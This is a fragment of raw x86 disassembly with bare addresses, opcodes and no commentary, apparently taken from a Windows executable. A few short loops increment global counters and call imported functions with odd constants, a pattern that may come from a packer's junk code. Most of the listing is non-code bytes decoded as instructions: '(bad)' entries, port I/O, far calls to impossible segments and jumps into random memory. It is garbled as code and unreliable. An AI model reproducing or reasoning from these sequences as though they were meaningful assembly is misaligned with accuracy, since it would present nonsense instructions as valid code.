  40ac7a:	or     bl,BYTE PTR [ebx+0x11b9409d]
  40ac80:	mov    esp,ecx
  40ac82:	cdq    
  40ac83:	sar    BYTE PTR [esi+0xfc83b50],0x84
  40ac8a:	pop    edi
  40ac8b:	or     eax,0x1d810000
  40ac90:	imul   esi,DWORD PTR [edi],0x43
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	out    dx,eax
  40ac9e:	aaa    
  40ac9f:	inc    ebx
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	add    BYTE PTR [eax],al
  40aca4:	add    BYTE PTR [ebx],dh
  40aca6:	leave  
  40aca7:	or     ecx,DWORD PTR ds:0x4337ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4337ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4337ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433888
  40acc6:	push   0x4338cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4337ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4337ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4337ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4337ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43379f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x1083eea],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40acfd
  40ad2c:	hlt    
  40ad2d:	sbb    al,0xbe
  40ad2f:	stos   BYTE PTR es:[edi],al
  40ad30:	out    dx,eax
  40ad31:	add    eax,0xcb54289b
  40ad36:	mov    esi,0xcf2e039e
  40ad3b:	in     al,0xf6
  40ad3d:	das    
  40ad3e:	iret   
  40ad3f:	xchg   ebx,eax
  40ad40:	cmc    
  40ad41:	mov    bl,0xa9
  40ad43:	loop   0x40ad0e
  40ad45:	jne    0x40ad01
  40ad47:	inc    edx
  40ad48:	mov    al,0x5b
  40ad4a:	push   ecx
  40ad4b:	push   ebp
  40ad4c:	test   eax,0xb5ab5586
  40ad51:	daa    
  40ad52:	fidiv  WORD PTR [ecx]
  40ad54:	jne    0x40adb3
  40ad56:	jb     0x40acfd
  40ad58:	stc    
  40ad59:	mov    al,ds:0xaef645ff
  40ad5e:	(bad)  
  40ad60:	and    DWORD PTR [ecx],edx
  40ad62:	xchg   edx,eax
  40ad63:	dec    edx
  40ad64:	xchg   edi,eax
  40ad65:	push   edx
  40ad66:	out    dx,al
  40ad67:	test   eax,0xd26b52f3
  40ad6c:	popf   
  40ad6d:	leave  
  40ad6e:	arpl   WORD PTR [esi-0x36],ax
  40ad71:	sub    DWORD PTR [ebp+0x4f],edi
  40ad74:	and    edx,DWORD PTR [ecx]
  40ad76:	retf   0xceb0
  40ad79:	pop    edi
  40ad7a:	and    eax,0xfc776b2a
  40ad7f:	cmp    al,bh
  40ad81:	sub    al,0xf3
  40ad83:	mov    al,ds:0x24232360
  40ad88:	cdq    
  40ad89:	rcl    BYTE PTR [esi-0xfcbe1c5],1
  40ad8f:	popa   
  40ad90:	dec    edi
  40ad91:	jb     0x40ade1
  40ad93:	sar    BYTE PTR [edi+0x54],0x92
  40ad97:	mov    ah,0xd8
  40ad99:	push   edi
  40ad9a:	mov    ds,WORD PTR [eax+ebp*4+0x1715b084]
  40ada1:	arpl   WORD PTR [ecx-0x4cbfa0ad],si
  40ada7:	int    0xa7
  40ada9:	out    dx,eax
  40adaa:	iret   
  40adab:	std    
  40adac:	stos   BYTE PTR es:[edi],al
  40adad:	sub    al,0x30
  40adaf:	push   esi
  40adb0:	jecxz  0x40ad38
  40adb2:	mov    ebx,0xc4930238
  40adb7:	sbb    ebx,ebx
  40adb9:	sub    dl,dl
  40adbb:	inc    edi
  40adbc:	jmp    0x40ad92
  40adbe:	push   edi
  40adbf:	inc    edi
  40adc0:	imul   esi,DWORD PTR [ebx+edx*2-0x6f],0xf634feaa
  40adc8:	test   eax,0x472dc712
  40adcd:	push   ebx
  40adce:	cmp    ah,BYTE PTR [eax+0xe]
  40add1:	or     ah,BYTE PTR [ecx-0x72]
  40add4:	xchg   BYTE PTR [eax],ah
  40add6:	mov    dl,0x34
  40add8:	mov    edx,0x244d4618
  40addd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adde:	adc    bh,BYTE PTR [ebx]
  40ade0:	mov    ebp,0x1a8de9ca
  40ade5:	leave  
  40ade6:	xchg   esp,eax
  40ade7:	adc    dh,BYTE PTR [edi-0x53d934dd]
  40aded:	inc    esi
  40adee:	rcr    BYTE PTR [eax-0x6f27dc6f],1
  40adf4:	cmp    eax,0xd29d2f1e
  40adf9:	nop
  40adfa:	xor    ebx,DWORD PTR [ecx]
  40adfc:	js     0x40add1
  40adfe:	pusha  
  40adff:	mov    bh,0x4c
  40ae01:	jle    0x40addf
  40ae03:	in     al,dx
  40ae04:	mov    dl,0xf0
  40ae06:	jbe    0x40ae4e
  40ae08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae09:	test   BYTE PTR [ecx+ecx*8-0x59],0x73
  40ae0e:	inc    eax
  40ae0f:	or     BYTE PTR [eax+0x1a],cl
  40ae12:	sti    
  40ae13:	lock adc al,0xea
  40ae16:	xor    ebp,DWORD PTR [ecx]
  40ae18:	add    eax,0xcb6daaa0
  40ae1d:	cs addr16 (bad) 
  40ae20:	xor    DWORD PTR [ebp+0x34f78934],esp
  40ae26:	mov    dh,0x11
  40ae28:	mov    ch,0xe5
  40ae2a:	imul   ebp,DWORD PTR [ebp+0x5],0xffffffad
  40ae2e:	ins    DWORD PTR es:[edi],dx
  40ae2f:	sahf   
  40ae30:	adc    ebx,esi
  40ae32:	(bad)  
  40ae33:	and    BYTE PTR [ecx+0x687d7d4c],al
  40ae39:	scas   eax,DWORD PTR es:[edi]
  40ae3a:	add    eax,0x345e895b
  40ae3f:	push   ebx
  40ae40:	daa    
  40ae41:	jle    0x40ae76
  40ae43:	loop   0x40ae0b
  40ae45:	inc    esp
  40ae46:	imul   ebx,DWORD PTR [ecx+0x75],0x1b
  40ae4a:	push   0x76
  40ae4c:	les    edx,FWORD PTR [ebp-0x3a81be2b]
  40ae52:	fidiv  DWORD PTR [eax]
  40ae54:	xchg   ebp,eax
  40ae55:	pop    esi
  40ae56:	xchg   ebp,eax
  40ae57:	add    ah,ah
  40ae59:	adc    bl,cl
  40ae5b:	sub    esp,DWORD PTR ds:0x19cad543
  40ae61:	xchg   ebp,eax
  40ae62:	mov    eax,ds:0xdd7e0399
  40ae67:	or     ecx,esi
  40ae69:	and    eax,DWORD PTR [eax+0x1169cdff]
  40ae6f:	sub    bh,BYTE PTR [eax+ebp*8-0x1700378c]
  40ae76:	adc    al,0x6f
  40ae78:	es cmp ch,cl
  40ae7b:	mov    edi,ecx
  40ae7d:	cmp    ch,cl
  40ae7f:	and    DWORD PTR [edi+0x6e],eax
  40ae82:	add    bl,bh
  40ae84:	push   ecx
  40ae85:	mov    bl,0x94
  40ae87:	add    bl,ch
  40ae89:	sbb    BYTE PTR [edi],ah
  40ae8b:	mov    eax,ds:0xaf8b1599
  40ae90:	cs sti 
  40ae92:	and    BYTE PTR [ebx-0x28a22dc6],dh
  40ae98:	cmp    edi,esp
  40ae9a:	mov    bh,0xfb
  40ae9c:	xchg   ecx,eax
  40ae9d:	xchg   cl,bl
  40ae9f:	add    DWORD PTR [edi-0x27],ebx
  40aea2:	push   ebx
  40aea3:	push   ebp
  40aea4:	fldcw  WORD PTR [eax-0x28]
  40aea7:	dec    ecx
  40aea8:	cwde   
  40aea9:	not    BYTE PTR [esi+0x31]
  40aeac:	aam    0xc6
  40aeae:	jmp    0x40aeb7
  40aeb0:	mov    edi,0x9ec9643e
  40aeb5:	not    DWORD PTR [edi-0x6d629c15]
  40aebb:	test   al,0x97
  40aebd:	arpl   WORD PTR [ebx+ebp*8-0x428f7268],di
  40aec4:	jg     0x40aead
  40aec6:	fistp  WORD PTR [ebp-0x1f4b34ae]
  40aecc:	add    ebx,DWORD PTR [esi+0x21]
  40aecf:	jno    0x40aebd
  40aed1:	adc    DWORD PTR [ecx-0x4],ecx
  40aed4:	adc    DWORD PTR [ebx+0x7a708c87],ecx
  40aeda:	jo     0x40af42
  40aedc:	mov    ch,0xd9
  40aede:	xchg   ecx,eax
  40aedf:	dec    ebp
  40aee0:	push   ds
  40aee1:	inc    ebp
  40aee2:	mov    edx,0xa5bb9d3a
  40aee7:	sbb    al,ah
  40aee9:	ds sti 
  40aeeb:	call   0xabd8ef87
  40aef0:	lds    ebx,FWORD PTR [esi+0x3c]
  40aef3:	jge    0x40aea8
  40aef5:	sahf   
  40aef6:	rcr    BYTE PTR [edx-0x649d3652],0x16
  40aefd:	cdq    
  40aefe:	in     al,dx
  40aeff:	mov    edx,0xe6f0955b
  40af04:	xchg   esi,eax
  40af05:	mov    ch,0xad
  40af07:	call   FWORD PTR [ebx+0x55]
  40af0a:	xor    esi,DWORD PTR [ecx+0x3b09cf3d]
  40af10:	sbb    al,0x8c
  40af12:	inc    ebx
  40af13:	mov    DWORD PTR [ebx+eax*8+0x7c7975e3],ebp
  40af1a:	sahf   
  40af1b:	mov    esi,0x79bf0093
  40af20:	loop   0x40af3a
  40af22:	aas    
  40af23:	jns    0x40aed7
  40af25:	sub    edi,DWORD PTR [eax]
  40af27:	sbb    al,0xda
  40af29:	scas   eax,DWORD PTR es:[edi]
  40af2a:	xchg   esi,eax
  40af2b:	ja     0x40af21
  40af2d:	hlt    
  40af2e:	fsub   st,st(3)
  40af30:	add    dh,0x96
  40af33:	push   es
  40af34:	pop    edi
  40af35:	lods   eax,DWORD PTR ds:[esi]
  40af36:	and    ebx,esp
  40af38:	lahf   
  40af39:	call   0xcb3ce457
  40af3e:	cmp    eax,edi
  40af40:	ja     0x40af39
  40af42:	xchg   ecx,eax
  40af43:	fsubr  QWORD PTR [ecx]
  40af45:	jge    0x40afb5
  40af47:	jecxz  0x40af7d
  40af49:	inc    edx
  40af4a:	inc    edx
  40af4b:	fisttp QWORD PTR [esi+0x47]
  40af4e:	ror    bl,cl
  40af50:	repnz pop es
  40af52:	fild   DWORD PTR [ebx-0x4e]
  40af55:	aaa    
  40af56:	or     BYTE PTR [ebp+0x7d],0x31
  40af5a:	out    dx,al
  40af5b:	pop    edi
  40af5c:	sbb    edx,DWORD PTR [edx]
  40af5e:	cmp    DWORD PTR [ecx],ebx
  40af60:	cmp    al,0xab
  40af62:	inc    edx
  40af63:	mov    ss,WORD PTR [esp+ebx*8-0x60]
  40af67:	xor    edi,eax
  40af69:	jecxz  0x40af81
  40af6b:	shr    BYTE PTR [ecx],0x1e
  40af6e:	call   0x40cc78e3
  40af73:	sbb    BYTE PTR [ecx+0x7018c9],al
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4337a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43375f
  40af93:	sub    DWORD PTR ds:0x43370f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43375b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43375b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43375b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43375b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43375b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43375b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43375b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43375b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4337a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	loop   0x40afd9
  40b019:	repz pop eax
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	(bad)  
  40b024:	call   FWORD PTR ds:0xfaf09aa9
  40b02a:	sbb    ebp,DWORD PTR [ebp-0x17]
  40b02d:	add    BYTE PTR [eax-0x36fe084c],cl
  40b033:	cs retf 
  40b035:	jecxz  0x40b080
  40b037:	fdiv   DWORD PTR [eax+0x53]
  40b03a:	loope  0x40b086
  40b03c:	xlat   BYTE PTR ds:[ebx]
  40b03d:	scas   al,BYTE PTR es:[edi]
  40b03e:	sub    DWORD PTR [ebp+0x26235942],edi
  40b044:	mov    edi,0xfc25f976
  40b049:	mul    DWORD PTR [ebp-0x58]
  40b04c:	push   es
  40b04d:	in     eax,0xc1
  40b04f:	xor    al,0x73
  40b051:	mov    esi,0x3ce8f95d
  40b056:	mul    dh
  40b058:	and    BYTE PTR [edx+eiz*4],bh
  40b05b:	jmp    0x973c135b
  40b060:	cmc    
  40b061:	sbb    DWORD PTR [ebx],edi
  40b063:	pop    edi
  40b064:	aaa    
  40b065:	push   cs
  40b066:	cmc    
  40b067:	mov    dh,0x6f
  40b069:	xchg   BYTE PTR [ebx+0xeb3edb9],al
  40b06f:	inc    edx
  40b070:	outs   dx,BYTE PTR ds:[esi]
  40b071:	scas   al,BYTE PTR es:[edi]
  40b072:	cmp    BYTE PTR [ebx],ah
  40b074:	hlt    
  40b075:	adc    eax,0x6722701c
  40b07a:	gs mov cl,0xac
  40b07d:	out    dx,eax
  40b07e:	daa    
  40b07f:	push   ebp
  40b080:	cmp    esp,ebp
  40b082:	repz xor cl,BYTE PTR [edi]
  40b085:	or     DWORD PTR [esi],esi
  40b087:	lahf   
  40b088:	jl     0x40b0a4
  40b08a:	stc    
  40b08b:	in     al,dx
  40b08c:	adc    ecx,esp
  40b08e:	test   DWORD PTR [edx+0x5c8e404f],0x9126c54b
  40b098:	mov    ebp,0xdc9d9e1c
  40b09d:	adc    eax,0x9625ed23
  40b0a2:	inc    eax
  40b0a3:	dec    ebx
  40b0a4:	ffree  st(3)
  40b0a6:	dec    esi
  40b0a7:	ret    0x376d
  40b0aa:	cmp    al,dl
  40b0ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0ad:	or     bh,ch
  40b0af:	hlt    
  40b0b0:	mov    dl,0xb5
  40b0b2:	scas   eax,DWORD PTR es:[edi]
  40b0b3:	scas   al,BYTE PTR es:[edi]
  40b0b4:	call   0xe398:0x7a85a5b1
  40b0bb:	dec    edx
  40b0bc:	adc    eax,0x2907d164
  40b0c1:	daa    
  40b0c2:	dec    ebp
  40b0c3:	xor    ebx,ecx
  40b0c5:	aam    0xe4
  40b0c7:	ss push ebx
  40b0c9:	and    bl,BYTE PTR [edx-0x716fc63]
  40b0cf:	jmp    0x40b0cb
  40b0d1:	out    dx,eax
  40b0d2:	lods   al,BYTE PTR ds:[esi]
  40b0d3:	inc    edi
  40b0d4:	in     eax,dx
  40b0d5:	daa    
  40b0d6:	pop    ss
  40b0d7:	call   0xf4613f60
  40b0dc:	or     eax,0xa7dcc14b
  40b0e1:	jge    0x40b068
  40b0e3:	lods   al,BYTE PTR ds:[esi]
  40b0e4:	aam    0xab
  40b0e6:	sar    BYTE PTR [edi+0x52],0x98
  40b0ea:	add    eax,0xf76f2bfb
  40b0ef:	cmp    esi,ebx
  40b0f1:	sub    cl,BYTE PTR [edx-0x27]
  40b0f4:	xor    DWORD PTR fs:[eax+0x2d584b9c],ebx
  40b0fb:	add    eax,0xa67673dd
  40b100:	jne    0x40b14a
  40b102:	fwait
  40b103:	push   eax
  40b104:	lahf   
  40b105:	or     ebp,esp
  40b107:	jmp    0xa8d49563
  40b10c:	push   esp
  40b10d:	dec    eax
  40b10e:	fwait
  40b10f:	(bad)  
  40b110:	jle    0x40b12a
  40b112:	add    DWORD PTR [ecx+eiz*2],edi
  40b115:	call   0x5674:0x53cc8021
  40b11c:	or     eax,0xa0a5d688
  40b121:	cli    
  40b122:	shr    esi,1
  40b124:	addr16 out dx,al
  40b126:	ret    
  40b127:	lods   eax,DWORD PTR ds:[esi]
  40b128:	(bad)  
  40b129:	repz push ss
  40b12b:	push   cs
  40b12c:	ficomp DWORD PTR [ebx+0x3e1f256d]
  40b132:	xchg   DWORD PTR [ebx+0x1cd0394f],edi
  40b138:	xor    ebx,esp
  40b13a:	jne    0x40b11e
  40b13c:	jo     0x40b0cd
  40b13e:	adc    al,0xf9
  40b140:	dec    edx
  40b141:	test   DWORD PTR [ebx],esp
  40b143:	cli    
  40b144:	push   eax
  40b145:	dec    edx
  40b146:	ficomp DWORD PTR [esi-0xf]
  40b149:	fidiv  WORD PTR [esp+ecx*1]
  40b14c:	add    al,0xb6
  40b14e:	dec    esp
  40b14f:	clc    
  40b150:	pushf  
  40b151:	and    al,0x16
  40b153:	bound  ebp,QWORD PTR es:[edi+0x69]
  40b157:	fwait
  40b158:	jp     0x40b0e0
  40b15a:	sbb    dl,BYTE PTR [edx]
  40b15c:	call   0x212ffd0f
  40b161:	xchg   esi,eax
  40b162:	pop    ss
  40b163:	add    eax,ecx
  40b165:	dec    eax
  40b166:	nop
  40b167:	popf   
  40b168:	pop    ds
  40b169:	xlat   BYTE PTR ds:[ebx]
  40b16a:	mov    ebp,0x2564f997
  40b16f:	ds jl  0x40b10a
  40b172:	neg    DWORD PTR [ebx+0x74]
  40b175:	les    ebp,FWORD PTR [ebx-0x1e]
  40b178:	inc    eax
  40b179:	dec    esp
  40b17a:	mov    dl,0x89
  40b17c:	pop    edx
  40b17d:	and    ecx,DWORD PTR [edi+0x5c]
  40b180:	sbb    dh,0xb7
  40b183:	inc    edx
  40b184:	inc    edi
  40b185:	andps  xmm4,XMMWORD PTR [ecx+0x57cbea29]
  40b18c:	cli    
  40b18d:	leave  
  40b18e:	pop    esi
  40b18f:	les    ebx,FWORD PTR [edi-0x1b]
  40b192:	inc    ebp
  40b193:	adc    DWORD PTR ds:0xd1d40fe4,ebp
  40b199:	int3   
  40b19a:	add    esp,edx
  40b19c:	lds    ebx,FWORD PTR [ebp-0x435e075b]
  40b1a2:	add    BYTE PTR [edi+0x33],0x97
  40b1a6:	mov    ?,WORD PTR [esi]
  40b1a8:	pop    ss
  40b1a9:	mov    dl,0x59
  40b1ab:	adc    eax,0x2b8a1163
  40b1b0:	cmp    al,0x1b
  40b1b2:	popa   
  40b1b3:	dec    esi
  40b1b4:	or     al,0x2c
  40b1b6:	adc    edi,DWORD PTR [edi]
  40b1b8:	aas    
  40b1b9:	shl    DWORD PTR [eax+0x26d54653],1
  40b1bf:	rol    BYTE PTR [esi-0x57],cl
  40b1c2:	imul   edx,DWORD PTR [edx+0x2f],0xf3060de8
  40b1c9:	xchg   ecx,eax
  40b1ca:	jle    0x40b17d
  40b1cc:	(bad)  
  40b1cf:	ins    DWORD PTR es:[edi],dx
  40b1d0:	push   ds
  40b1d1:	or     esp,DWORD PTR [esi+0x62]
  40b1d4:	btc    ebp,esp
  40b1d7:	mov    ch,0xbd
  40b1d9:	mov    cl,0x7e
  40b1db:	sub    dl,0x3d
  40b1de:	ja     0x40b1ce
  40b1e0:	push   0xd1e4ba30
  40b1e5:	xor    eax,0xd56829ab
  40b1ea:	pop    esp
  40b1eb:	dec    ecx
  40b1ec:	cmp    edi,ebx
  40b1ee:	add    eax,0x5125793e
  40b1f3:	jp     0x40b244
  40b1f5:	repnz mov ecx,0x703bbd2e
  40b1fb:	add    dh,BYTE PTR [ebp-0x55]
  40b1fe:	iret   
  40b1ff:	push   ebx
  40b200:	push   cs
  40b201:	clc    
  40b202:	mov    cl,dl
  40b204:	mov    ebx,DWORD PTR [eax+ebx*2]
  40b207:	int    0x6e
  40b209:	pop    ecx
  40b20a:	ror    eax,1
  40b20c:	xor    eax,esp
  40b20e:	pop    eax
  40b20f:	push   0x3c
  40b211:	inc    esp
  40b212:	dec    esi
  40b213:	and    eax,0x19e29b08
  40b218:	call   0x7c09:0x6962abef
  40b21f:	pushf  
  40b220:	jp     0x40b225
  40b222:	pop    ebp
  40b223:	les    eax,FWORD PTR [ebp-0x58538cec]
  40b229:	jb     0x40b212
  40b22b:	xor    al,0xde
  40b22d:	xor    edx,eax
  40b22f:	scas   al,BYTE PTR es:[di]
  40b231:	ds enter 0xbe41,0x96
  40b236:	lahf   
  40b237:	xlat   BYTE PTR ds:[ebx]
  40b238:	jmp    0x40b23c
  40b23a:	or     edi,DWORD PTR ds:0xb75bab4b
  40b240:	fisub  DWORD PTR [ecx+0x4ec43083]
  40b246:	xchg   esp,eax
  40b247:	pop    edx
  40b248:	fwait
  40b249:	fs mov fs,edx
  40b24c:	dec    edi
  40b24e:	imul   edi,edi,0xffffffb1
  40b251:	inc    esi
  40b252:	neg    DWORD PTR [ebp-0x39f1e3c8]
  40b258:	push   eax
  40b259:	push   0x79
  40b25b:	push   ecx
  40b25c:	mov    esp,0x17148f08
  40b261:	xchg   BYTE PTR [edx-0x56b8bd27],ch
  40b267:	or     bh,BYTE PTR [esi-0x7413ba75]
  40b26d:	dec    ebp
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	mov    eax,ds:0x2edde453
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	inc    ebp
  40b290:	or     BYTE PTR [edi],0x5b
  40b293:	test   dh,ah
  40b295:	push   edi
  40b296:	pop    ecx
  40b297:	lods   eax,DWORD PTR ds:[esi]
  40b298:	push   0x46
  40b29a:	inc    esi
  40b29b:	xchg   esi,eax
  40b29c:	jno    0x40b2ef
  40b29e:	adc    dl,bl
  40b2a0:	rcl    BYTE PTR [esp+ecx*1],1
  40b2a3:	inc    ebx
  40b2a4:	cmp    ebp,DWORD PTR [edx+0x22]
  40b2a7:	in     eax,dx
  40b2a8:	dec    ebp
  40b2a9:	inc    eax
  40b2aa:	pop    edi
  40b2ab:	sbb    DWORD PTR [esi],eax
  40b2ad:	sub    BYTE PTR [ebp+0x31],al
  40b2b0:	sub    DWORD PTR [edi-0x67],0xfffffff7
  40b2b4:	or     BYTE PTR fs:[edx],al
  40b2b7:	jae    0x40b2ab
  40b2b9:	(bad)  
  40b2ba:	sti    
  40b2bb:	frstor [eax-0x496cc436]
  40b2c1:	dec    edx
  40b2c2:	in     eax,dx
  40b2c3:	loopne 0x40b32c
  40b2c5:	daa    
  40b2c6:	sbb    edi,ebx
  40b2c8:	xchg   esp,eax
  40b2c9:	les    ebp,FWORD PTR [ebx+0x7264debc]
  40b2cf:	add    BYTE PTR [eax],ch
  40b2d1:	stos   BYTE PTR es:[edi],al
  40b2d2:	ret    0x2dc
  40b2d5:	or     ecx,ecx
  40b2d7:	mov    ebp,0xfd02c5b2
  40b2dc:	hlt    
  40b2dd:	pop    ebx
  40b2de:	stc    
  40b2df:	aas    
  40b2e0:	or     al,0xf7
  40b2e2:	gs jns 0x4e5c0d1f
  40b2e9:	mov    ds:0xec4ebbb4,eax
  40b2ee:	mov    ebp,0xe61c30c3
  40b2f3:	push   cs
  40b2f4:	lods   al,BYTE PTR ds:[esi]
  40b2f5:	cli    
  40b2f6:	adc    ch,BYTE PTR [ecx]
  40b2f8:	push   es
  40b2f9:	and    eax,0xc04c41ea
  40b2fe:	pusha  
  40b2ff:	fcmovbe st,st(3)
  40b301:	inc    ecx
  40b302:	fs jg  0x40b2d3
  40b305:	outs   dx,DWORD PTR ds:[esi]
  40b306:	int    0xfa
  40b308:	lods   eax,DWORD PTR ds:[esi]
  40b309:	ins    BYTE PTR es:[edi],dx
  40b30a:	call   0xe6bc:0x108e24d7
  40b311:	push   es
  40b312:	inc    ebp
  40b313:	test   BYTE PTR [ecx-0x4fbd816e],0x79
  40b31a:	les    edi,FWORD PTR [esi+0x68]
  40b31d:	cs ds mov esi,0xf8963981
  40b324:	push   ds
  40b325:	icebp  
  40b326:	call   0x27b2:0x2317740d
  40b32d:	fimul  WORD PTR [ebx-0x2f]
  40b330:	stos   DWORD PTR es:[di],eax
  40b332:	je     0x40b3a1
  40b334:	sub    DWORD PTR [edx+0x20],eax
  40b337:	loope  0x40b379
  40b339:	add    edi,DWORD PTR [eax]
  40b33b:	dec    ecx
  40b33c:	adc    al,0x64
  40b33e:	test   eax,0x192963ab
  40b343:	mov    edx,0xcc436fc5
  40b348:	push   ecx
  40b349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b34a:	jno    0x40b2cf
  40b34c:	clc    
  40b34d:	fistp  WORD PTR [eax-0x7d4b8a96]
  40b353:	dec    edi
  40b354:	push   es
  40b355:	outs   dx,DWORD PTR ds:[esi]
  40b356:	hlt    
  40b357:	and    dh,BYTE PTR [edx-0x79430a8c]
  40b35d:	mov    edi,0xd3e6baad
  40b362:	push   esp
  40b363:	or     dl,dh
  40b365:	adc    cl,BYTE PTR [eax]
  40b367:	pop    ds
  40b368:	push   esi
  40b369:	pop    ebp
  40b36a:	mov    fs,esi
  40b36c:	push   edx
  40b36d:	mov    eax,0x767a8f4
  40b372:	adc    BYTE PTR ds:0x78e9fb9f,ah
  40b378:	sub    ebp,ecx
  40b37a:	cmp    BYTE PTR [esi-0x3e],dh
  40b37d:	imul   ecx,DWORD PTR [ecx-0x22c9a5ce],0xfffffff1
  40b384:	jle    0x40b3b1
  40b386:	push   0xffffffd3
  40b388:	add    esp,DWORD PTR [edi+0x67]
  40b38b:	js     0x40b3a7
  40b38d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b38e:	xchg   bl,cl
  40b390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b391:	int    0x15
  40b393:	dec    esi
  40b394:	ret    
  40b395:	ss mov eax,0xf173c32
  40b39b:	scas   al,BYTE PTR es:[edi]
  40b39c:	mov    gs,edi
  40b39e:	mov    esp,0x733eb270
  40b3a3:	imul   ebp,DWORD PTR [esi],0xffffffb4
  40b3a6:	retf   
  40b3a7:	mov    edx,0xada6c39b
  40b3ac:	dec    eax
  40b3ad:	or     al,0xba
  40b3af:	cmp    BYTE PTR [eax-0x2f9eef93],dh
  40b3b5:	test   eax,0xb2bdcf4f
  40b3ba:	jbe    0x40b3a9
  40b3bc:	mov    esi,0xdab280ad
  40b3c1:	cwde   
  40b3c2:	and    al,BYTE PTR cs:[ebx-0x4a6f7e66]
  40b3c9:	adc    eax,0xdbe93a7f
  40b3ce:	icebp  
  40b3cf:	mov    ecx,0x9b59dbc
  40b3d4:	dec    edi
  40b3d5:	pop    es
  40b3d6:	jns    0x40b427
  40b3d8:	xchg   edx,eax
  40b3d9:	mov    esp,0xf5c18bd4
  40b3de:	in     al,dx
  40b3df:	lock out dx,eax
  40b3e1:	jns    0x40b459
  40b3e3:	cmp    al,0x40
  40b3e5:	lock sub al,0x31
  40b3e8:	out    dx,al
  40b3e9:	arpl   WORD PTR [eax+0x20],bx
  40b3ec:	push   edx
  40b3ed:	push   0x4a
  40b3ef:	(bad)
  40b3f3:	mov    ds:0x920e4fa0,eax
  40b3f8:	and    BYTE PTR [edx+0x34],al
  40b3fb:	in     eax,dx
  40b3fc:	cmc    
  40b3fd:	mov    ds:0x8879aa91,al
  40b402:	cmp    cl,BYTE PTR [edx+0x3]
  40b405:	fld    TBYTE PTR [ebp-0x268ca5ca]
  40b40b:	xlat   BYTE PTR ds:[ebx]
  40b40c:	test   BYTE PTR [edi-0x7014e691],cl
  40b412:	icebp  
  40b413:	xlat   BYTE PTR ds:[ebx]
  40b414:	push   edi
  40b415:	nop
  40b416:	ror    ebp,cl
  40b418:	in     eax,0x7c
  40b41a:	sti    
  40b41b:	push   ds
  40b41c:	cmp    DWORD PTR [esp-0x1c],esi
  40b420:	rcl    DWORD PTR [ebp-0x22],1
  40b423:	push   esi
  40b424:	pop    edi
  40b425:	arpl   WORD PTR [edi-0x1],si
  40b428:	and    edi,esp
  40b42a:	add    ch,ch
  40b42c:	and    al,0xef
  40b42e:	jp     0x40b3d5
  40b430:	test   al,0x25
  40b432:	xor    eax,DWORD PTR [esi]
  40b434:	jns    0x40b3e8
  40b436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b437:	xchg   ecx,eax
  40b438:	cmp    eax,0x4dac524
  40b43d:	imul   ebp,DWORD PTR [edi+0x12d53a7f],0xf3657dfa
  40b447:	xor    DWORD PTR [esi+0x3b],0x5f97c9d8
  40b44e:	cld    
  40b44f:	adc    al,BYTE PTR [eax+edx*2+0x539844d5]
  40b456:	mov    esi,DWORD PTR ds:0x2a188706
  40b45c:	rol    BYTE PTR [edi+0x5e],1
  40b45f:	dec    ebp
  40b460:	rcl    eax,cl
  40b462:	dec    eax
